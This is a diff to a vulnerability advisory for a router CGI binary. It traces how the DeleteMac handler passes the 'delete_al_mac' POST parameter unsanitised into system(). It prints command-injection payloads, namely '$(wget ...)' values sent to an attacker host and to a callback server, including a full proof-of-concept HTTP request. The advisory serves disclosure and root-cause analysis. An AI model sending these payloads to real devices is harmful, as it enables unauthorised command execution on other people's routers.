@@ -30,6 +30,48 @@ sub_405314(v20);  // calls system()
 
 The `delete_al_mac` parameter is the 2nd argument in the sprintf call (variable `v6`). No sanitization is applied.
 
+## Binary Analysis
+
+### Call Chain
+
+```
+ftext (main router)
+  → sub_402D1C (DeleteMac handler)
+    → sub_405EA8 (URL decode, reads delete_al_mac POST parameter)
+    → sprintf (concatenates into shell command)
+    → sub_405314 (system() wrapper)
+```
+
+### Key Functions
+
+**sub_402D1C (DeleteMac handler):**
+- Reads four POST parameters via `sub_405EA8`:
+  - `delete_list` → variable `v4`
+  - `delete_al_mac` → variable `v6`
+  - `b_delete_list` → variable `v8`
+  - `b_delete_al_mac` → variable `v10`
+- Concatenates all four into a shell command and executes via `sub_405314`
+
+**sub_405314 (system wrapper):**
+```c
+void sub_405314(const char *cmd) {
+    system(cmd);
+}
+```
+
+### Vulnerability Flow
+
+1. User sends POST request with `page=DeleteMac&delete_list=AA&delete_al_mac=$(wget http://attacker:6666/callback)`
+2. `sub_402D1C` reads `delete_al_mac` → `$(wget http://attacker:6666/callback)`
+3. No input filter is called (unlike GuestWifi handler)
+4. sprintf constructs: `/etc/lighttpd/www/cgi-bin/del_mac.sh yAA y$(wget http://attacker:6666/callback) y y &`
+5. `sub_405314` calls `system()`, shell interprets `$(wget ...)` as command substitution
+6. `wget` connects to attacker's server, confirming command execution
+
+### Why No Filter
+
+The DeleteMac handler (`sub_402D1C`) does NOT call the input filter function `sub_4074A0`. This is likely because the developer assumed the MAC address parameters would only contain hex characters (0-9, A-F, colons), but no validation enforces this assumption.
+
 ## Proof of Concept (PoC)
 
 ```http
@@ -42,3 +84,12 @@ Content-Length: 82
 
 page=DeleteMac&delete_list=AA&delete_al_mac=$(wget http://192.168.6.1:6666/del_al)
 ```
+
+**Verification:** Monitor receives `GET /del_al` from device IP, confirming command execution.
+
+## Root Cause Summary
+
+The root cause is:
+1. No input sanitization or validation of the `delete_al_mac` parameter
+2. No input filter function is called in the DeleteMac handler
+3. Direct concatenation of user input into a shell command passed to `system()`
